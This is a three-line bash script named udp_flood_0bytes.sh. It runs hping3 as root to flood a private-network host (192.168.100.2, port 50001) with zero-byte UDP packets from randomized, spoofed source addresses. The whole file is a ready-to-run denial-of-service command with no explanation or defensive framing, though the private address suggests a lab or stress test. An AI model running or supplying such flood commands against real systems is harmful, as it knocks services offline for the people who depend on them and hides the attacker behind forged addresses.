#!/bin/bash
# chmod +x udp_flood_0bytes.sh
sudo hping3 -2 192.168.100.2 -p 50001 --rand-source -d 0 --flood